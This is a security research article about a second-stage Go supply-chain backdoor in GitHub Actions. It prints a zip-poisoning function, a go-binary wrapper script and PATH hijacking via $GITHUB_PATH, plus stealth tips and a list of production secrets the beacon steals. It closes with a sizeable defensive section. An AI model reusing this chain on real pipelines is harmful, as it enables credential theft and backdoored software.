# V2: The Go Binary That Hijacks Its Own Compiler

> [!NOTE]
> Read [V1](../README.md) first. This article assumes you're already familiar with the GOPROXY substitution + go.sum poisoning + beacon injection attack chain. V2 doesn't replace it. It overcomes its two hard limits.

> [!IMPORTANT]
> Same disclaimer as V1: **educational purposes and knowledge sharing only**. Don't be that person.

---

**What's new:** `$GITHUB_PATH` hijacking -> `go` binary wrapper -> local `file://` proxy -> zero egress, zero env var dependency  
**What it defeats:** Egress restrictions on CI runners + job-level YAML `env:` pinning  
**What stays the same:** Beacon in the binary, fires forever, no trace in source code

---

## Table of Contents

- [Where V1 Hits a Wall](#where-v1-hits-a-wall)
- [The Idea: Don't Ask for Permission, Replace the Compiler](#the-idea-dont-ask-for-permission-replace-the-compiler)
- [The V2 Attack, Visualized](#the-v2-attack-visualized)
- [Phase 1: The Wrapper Install](#phase-1-the-wrapper-install)
- [Phase 2: The File-Based Proxy](#phase-2-the-file-based-proxy)
- [Phase 3: The Beacon (Unchanged, But Deadlier)](#phase-3-the-beacon-unchanged-but-deadlier)
- [Why This Bypasses Both Defenses](#why-this-bypasses-both-defenses)
- [How to Actually Stop V2](#how-to-actually-stop-v2)
- [Closing](#closing)

---

## Where V1 Hits a Wall

V1 was elegant, but it had two clean kill switches:

### Kill Switch 1: Egress Restrictions

V1 pointed `GOPROXY` at the attacker's server. If the CI runner has network policies (egress firewalling, VPC restrictions, allowlisted domains) the build step can't reach the C2 proxy. Game over.

```
Runner ──✗──-> attacker.ngrok-free.app   (blocked by egress policy)
Runner ──✓──-> proxy.golang.org          (allowed, it's the Go module proxy)
```

### Kill Switch 2: Job-Level `env:` Pinning

A single YAML block at the job level defeats the entire V1 chain:

```yaml
env:
  GOPROXY: "proxy.golang.org,direct"
  GOSUMDB: "sum.golang.org"
  GOMODCACHE: "/home/runner/go/pkg/mod"
```

Job-level `env:` is set by the **runner process**, not the shell. `$GITHUB_ENV` writes cannot override it. V1 writes `GOPROXY=attacker` to `$GITHUB_ENV`, the runner says "no, YAML wins," and the build goes to `proxy.golang.org` untouched.

Both defenses are well-documented and easy to deploy. A security-conscious team that reads the V1 article would be immune in five minutes.

So I asked: what if the malicious code doesn't *ask* Go where to look, but *becomes* the `go` command?

---

## The Idea: Don't Ask for Permission, Replace the Compiler

Instead of writing environment variables and hoping nobody overrides them, V2:

1. **Finds the real `go` binary** and records its absolute path
2. **Downloads the real logrus** from `proxy.golang.org` (normal traffic)
3. **Injects the beacon** into the zip locally (no outbound connection to C2)
4. **Stages a `file://` proxy** (a local directory with the poisoned zip, speaking the Go module proxy protocol)
5. **Writes a wrapper script** that calls the real `go` with forced flags
6. **Hijacks `$PATH`** via `$GITHUB_PATH` so every subsequent step calls the wrapper first

The wrapper is a thin bash script. When the next step runs `go build`, the shell finds the wrapper before the real `go`. The wrapper sets `GOPROXY`, `GOSUMDB`, `GOMODCACHE` (all of them) at the **process level**, right before `exec`-ing the real compiler. Job-level env vars? They never reach the real `go` binary. The wrapper replaces them.

---

## The V2 Attack, Visualized

```
Developer adds malicious dep to go.mod
          │
          ▼
┌──────────────────────────────────────────────────────┐
│  Phase 1: go test (init() fires silently)           │
│                                                      │
│  • Find real go binary -> /opt/.../go1.21/bin/go     │
│  • Download real logrus zip from proxy.golang.org    │
│  • Inject beacon -> poisoned zip (local, no egress)  │
│  • Stage file:// proxy in /tmp/.go-pkg-cache/        │
│  • Write wrapper shim -> /tmp/.go-tool/bin/go        │
│  • Append /tmp/.go-tool/bin to $GITHUB_PATH          │
│  • Strip logrus from go.sum                          │
└────────────────────┬─────────────────────────────────┘
                     │  PATH is now hijacked
                     ▼
┌──────────────────────────────────────────────────────┐
│  Phase 2: go build (wrapper intercepts)              │
│                                                      │
│  Shell resolves: /tmp/.go-tool/bin/go                │
│  Wrapper sets:                                       │
│    GOPROXY=file:///tmp/.go-pkg-cache,...,direct       │
│    GOSUMDB=off  GOMODCACHE=/tmp/.go-pkg-mod          │
│  exec /opt/.../go1.21/bin/go build -mod=mod          │
│                                                     │
│  • Go checks file:// proxy first -> finds logrus     │
│  • Extracts poisoned zip with beacon                 │
│  • go.sum updated silently (-mod=mod)                │
│  • Other modules fall through to proxy.golang.org    │
└────────────────────┬─────────────────────────────────┘
                     │  beacon compiled into the binary
                     ▼
┌──────────────────────────────────────────────────────┐
│  Phase 3: ./app (every run, everywhere)              │
│                                                      │
│  • Same as V1: logrus init() fires on startup        │
│  • POST /collect with os.Environ() to C2             │
│  • Silent. Permanent. Compiled in forever.           │
└──────────────────────────────────────────────────────┘
```

**The key difference:** V1 needs the runner to talk to the attacker during the *build*. V2 only talks to `proxy.golang.org` during the build. The poisoning happens locally. The C2 contact happens later, at *runtime*, from wherever the binary is deployed.

---

## Phase 1: The Wrapper Install

The new `analytics.go` init() does four things the V1 never needed to:

### 1. Find the Real Go Binary

Before installing the wrapper, we need the absolute path to the real `go` binary. The init searches `GOROOT` then `PATH`, and resolves symlinks with `filepath.EvalSymlinks`. This matters because `actions/setup-go` creates symlinks into a toolcache directory. If we recorded the symlink and it breaks between steps, the wrapper would recurse on itself instead of calling the real compiler.

### 2. Download and Poison the Zip Locally

```go
func _buildBundle(module, version, telemetryEndpoint string) []byte {
    upstream := "https://" + "proxy.go" + "lang.org"
    zipURL := upstream + "/" + module + "/@v/" + version + ".zip"

    resp, err := (&http.Client{}).Get(zipURL)
    // ... error handling ...
    original, _ := io.ReadAll(resp.Body)

    // Open the real zip, copy everything, inject telemetry.go
    reader, _ := zip.NewReader(bytes.NewReader(original), int64(len(original)))
    var buf bytes.Buffer
    writer := zip.NewWriter(&buf)

    for _, f := range reader.File {
        // ... copy each file unchanged ...
    }

    // Inject the beacon
    prefix := module + "@" + version + "/"
    fw, _ := writer.Create(prefix + "telemetry.go")
    fw.Write([]byte(_telemetrySource(telemetryEndpoint)))
    writer.Close()
    return buf.Bytes()
}
```

This is the same zip-poisoning logic as V1's `goproxy_server.py`, but rewritten in Go and running *inside the init()*. The HTTP GET to `proxy.golang.org` is indistinguishable from normal module resolution during `go test`, because it IS normal module resolution traffic. Just not from the `go` tool.

### 3. Stage the Local File Proxy

Go's `GOPROXY` supports three schemes: `https://`, `http://`, and `file://`. The `file://` scheme reads from a local directory that follows the exact same layout as an HTTP module proxy:

```
/tmp/.go-pkg-cache/
└── github.com/sirupsen/logrus/@v/
    ├── list              -> "v1.9.4\n"
    ├── v1.9.4.info       -> {"Version":"v1.9.4","Time":"2024-02-23T12:19:56Z"}
    ├── v1.9.4.mod        -> (real go.mod from upstream)
    └── v1.9.4.zip        -> (poisoned zip with beacon)
```

The init just creates this directory and writes the four files. No HTTP server, no background process, no port management. Just files on disk. Go reads them like any other module proxy, because it is one.

### 4. Install the Wrapper and Hijack PATH

The init writes a bash script to `/tmp/.go-tool/bin/go`. This is what it generates:

```bash
#!/bin/bash
case "$1" in
    build|test|list|run|install|get|vet|mod)
        exec env GOPROXY="file:///tmp/.go-pkg-cache,https://proxy.golang.org,direct" \
                 GOSUMDB=off GONOSUMDB='*' GOMODCACHE="/tmp/.go-pkg-mod" \
                 /opt/hostedtoolcache/go/1.21.0/x64/bin/go "$1" -mod=mod "${@:2}" ;;
    *)
        exec /opt/hostedtoolcache/go/1.21.0/x64/bin/go "$@" ;;
esac
```

Build-related subcommands get the poisoned environment and `-mod=mod`. Everything else (`go version`, `go env`) passes through unchanged, so nothing errors and `go env` shows the default config. Subtle but important for stealth.

Then the shim directory gets appended to `$GITHUB_PATH`. The runner reads this file after each step and prepends its contents to `PATH`. Our `/tmp/.go-tool/bin` goes first, before the real Go binary.

### Gotcha: `actions/setup-go` Cache Interaction

> This one bit me during the PoC and it's worth calling out.

`actions/setup-go@v5` has a post-step that saves the Go module cache after the job finishes. That post-step runs `go env GOMODCACHE` (or similar) to find the cache directory. Since the wrapper is still on `PATH` at post-step time, the post-step calls our wrapper instead of the real `go`. The wrapper forces `GOPROXY=file://...` and `-mod=mod` for build-related subcommands, but `go env` is in the pass-through case, so it should work fine.

Except it doesn't. The `actions/setup-go` cache step tries to compute a cache key, and something in its interaction with the wrapper causes it to hang indefinitely. The job completes, all steps pass, but the post-step never finishes. The runner sits there forever.

**The fix is `cache: false`** in the `setup-go` step. You don't need the cache for the attack to work. `go mod download` in a previous step handles dependency resolution, and the wrapper redirects `GOMODCACHE` to a fresh `/tmp` directory anyway. Disabling the cache also has the side effect of making the pipeline slightly faster (no cache upload/download) and leaving less forensic evidence (no cached artifacts).

This is one of those things that wouldn't matter in a real attack (the attacker doesn't care if the pipeline hangs after the binary is built and shipped), but for a demo it matters a lot. Something to keep in mind if you're reproducing this.

---

## Phase 2: The File-Based Proxy

When the next step runs `go build ./...`, the shell finds our wrapper first. Go resolves modules in `GOPROXY` order:

1. **`file:///tmp/.go-pkg-cache`**: local proxy. Logrus is there (poisoned). Everything else, 404.
2. **`https://proxy.golang.org`**: fallback for all other modules. Normal traffic.
3. **`direct`**: last resort, VCS checkout.

Logrus comes from disk. No network, no DNS to trace. Every other module downloads from `proxy.golang.org` as usual. The build log looks completely normal.

Since cache.go already stripped the legitimate logrus hash during Phase 1, `-mod=mod` lets Go write the poisoned hash into `go.sum` without complaint.

One subtlety: the poisoned hash **changes between runs**. The zip is rebuilt from scratch each time, and the resulting archive has different compression metadata. A defender comparing `go.sum` across builds would see a different logrus hash each time (which is suspicious), but you can't maintain a blocklist of "known bad" hashes.

---

## Phase 3: The Beacon (Unchanged, But Deadlier)

Same core as V1. `telemetry.go` is injected into the logrus package, declares `package logrus`, fires a goroutine on `init()` that POSTs `os.Environ()` to the C2.

The only difference from V1: the C2 URL is now baked in during init() (Phase 1) rather than by the Python proxy server. The `_analyticsNodes` IP-octet array now encodes the beacon's call-home URL instead of the proxy address. No external server needed during the build. The entire poisoning is self-contained.

But here's the thing V2 makes more obvious: the beacon doesn't just fire in CI. It fires **everywhere the binary runs**. And in practice, that means production. Think Kubernetes pods, ECS tasks, Cloud Run containers. The `os.Environ()` dump from a prod environment is a goldmine compared to CI:

```
  KUBERNETES_SERVICE_HOST=10.96.0.1
  AWS_ACCESS_KEY_ID=AKIA...
  AWS_SECRET_ACCESS_KEY=...
  DATABASE_URL=postgres://prod-user:password@rds-instance:5432/mydb
  REDIS_URL=redis://:authtoken@redis.internal:6379
  STRIPE_SECRET_KEY=sk_live_...
  JWT_SIGNING_KEY=...
  VAULT_TOKEN=hvs.CAES...
  SERVICE_ACCOUNT_TOKEN=eyJhbG...
```

CI tokens expire. Prod credentials don't rotate themselves. One beacon firing from a K8s pod gives you database credentials, cloud provider keys, payment processor secrets, and service mesh tokens. The binary runs for months. The beacon fires on every restart, every rolling update, every pod reschedule.

The C2 URL is encoded with the same IP-octet trick from V1 (see the V1 article for the encoding details).

---

## Why This Bypasses Both Defenses

### Defense 1: Egress Restrictions -> Bypassed

V2 never contacts the attacker during the build. The only outbound traffic is to `proxy.golang.org`, which any Go build does by default. The poisoning happens entirely on the local filesystem.

```
V1: Runner ──-> attacker.ngrok-free.app     ← BLOCKED by egress policy
V2: Runner ──-> proxy.golang.org            ← ALLOWED (normal Go traffic)
    Runner ──-> /tmp/.go-pkg-cache (local)  ← no network at all
```

The beacon still phones home at *runtime*, but from the deployed environment (K8s pods, cloud VMs, developer laptops), not from the CI runner. Different network, different rules. And the env vars it grabs in prod are worth a lot more than a `GITHUB_TOKEN`.

### Defense 2: Job-Level `env:` Pinning -> Bypassed

This is the clever part. V1 wrote to `$GITHUB_ENV`, which loses to job-level `env:`. V2 doesn't write environment variables at all. It replaces the binary.

```yaml
# This stopped V1 cold:
env:
  GOPROXY: "proxy.golang.org,direct"
  GOSUMDB: "sum.golang.org"
```

The runner dutifully sets `GOPROXY=proxy.golang.org,direct` in the shell environment. Then the shell runs `go build`, resolves `go` to our wrapper, and the wrapper does:

```bash
exec env GOPROXY="file:///tmp/.go-pkg-cache,..." GOSUMDB=off /real/go -mod=mod build ...
```

The `env` command **replaces** the inherited environment variables for the `exec`d process. The real `go` binary never sees the job-level `GOPROXY`. It sees ours. Game over.

There is no `$GITHUB_PATH` equivalent of job-level env pinning. You can't pin `PATH` at the job level to prevent modifications. It's designed to be extended by setup actions.

### Side-by-side

| Vector | V1 | V2 |
|--------|----|----|
| Outbound to attacker domain from CI | Yes | **No** |
| Outbound to proxy.golang.org from CI | Via attacker proxy | **Direct** (normal) |
| `$GITHUB_ENV` writes | Yes (5 vars) | **No** |
| `$GITHUB_PATH` writes | No | Yes (1 dir) |
| Job-level `env:` pinning | **Defeats it** | Bypassed |
| Egress restrictions | **Defeats it** | Bypassed |
| External C2 server needed during build | Yes (proxy) | **No** |
| Needs Python on attacker side | Yes (goproxy_server.py) | **No** (self-contained) |
| Detection surface | GITHUB_ENV + egress | GITHUB_PATH only |

---

## How to Actually Stop V2

V2 is harder to stop than V1 because the two easy fixes no longer work. But it's not unstoppable.

### 1. Monitor `$GITHUB_PATH` Writes

`go test` has no legitimate reason to modify `PATH`. If a test step writes to `$GITHUB_PATH`, something is wrong.

```yaml
- name: Test
  run: |
    go test ./...
    if [ -s "$GITHUB_PATH" ]; then
      echo "::error::GITHUB_PATH was modified during tests"
      cat "$GITHUB_PATH"
      exit 1
    fi
```

### 2. Verify Toolchain Integrity

Check that `go` resolves to the expected binary after each step:

```yaml
- name: Verify Go
  run: |
    EXPECTED=$(which go)  # set this to the known-good path
    if [ "$(which go)" != "/opt/hostedtoolcache/go/..." ]; then
      echo "::error::go binary has been replaced"
      exit 1
    fi
```

### 3. Immutable `$PATH` (Container-Based Runners)

Run your CI in a container where `/usr/local/bin` is a read-only mount and `$GITHUB_PATH` is not writable from test steps. This is the nuclear option but it works.

### 4. Separate Test and Build Jobs

If `go test` and `go build` run in **different jobs**, `$GITHUB_PATH` writes from the test job don't carry over. The wrapper only lives in the test runner's filesystem.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: go test ./...    # ← Phase 1 fires, but wrapper stays here

  build:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - run: go build ./...   # ← Clean runner, no wrapper, no poisoning
```

This is the simplest and most effective defense, but it doubles your runner minutes and complicates artifact sharing.

### 5. Network Restrictions Still Help (Partially)

Egress rules don't stop the *build-time* poisoning (V2's whole point), but they do stop the *runtime* beacon. If your deployed binaries run in an environment with strict egress, the beacon can't phone home. Defense in depth still matters. That said, most K8s clusters and cloud workloads allow outbound HTTPS. Network policies that actually block a simple POST to an external endpoint are rarer than people think.

### 6. Package scanning

The `archive/zip` + `net/http` imports in what claims to be an analytics module are unusual. An `init()` that reaches into the filesystem to write executable scripts is suspicious regardless of how the strings are obfuscated. Behavioral analysis ("this init function creates files in /tmp and writes to GITHUB_PATH") would catch V2 even without pattern-matching specific strings.

---

## Closing

V1 proved that a well-placed `init()` could silently backdoor a binary through CI. V2 proves that the obvious defenses (env pinning and egress restrictions) only raise the bar. They don't change the game.

The fundamental issue is the same: **Go's init() executes arbitrary code at import time, and CI pipelines give that code access to powerful side-channels** (`$GITHUB_PATH`, `$GITHUB_ENV`, the filesystem). V2 just picks a different side-channel that happens to be harder to lock down.

The real fix is layered: separate jobs for test and build, toolchain integrity verification, `$GITHUB_PATH` monitoring, and behavioral analysis of init() functions that touch the filesystem. No single knob turns this off anymore.

Or just don't add random dependencies from strangers on the internet. But we both know how that goes.

---

## References

- [V1: Silently Backdooring a Golang Binary in GitHub Actions](../README.md)
- [Go module proxy protocol (`file://` scheme)](https://go.dev/ref/mod#goproxy-protocol)
- [`GITHUB_PATH` documentation](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/adding-a-system-path)
- [`GITHUB_ENV` vs job-level `env:`](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables)

---

*V2 source: [`v2/theme-heartbeat/analytics.go`](./theme-heartbeat/analytics.go) · V1 source: [`theme-heartbeat/`](../theme-heartbeat/) · beacon: [`telemetry.go`](./telemetry.go)*
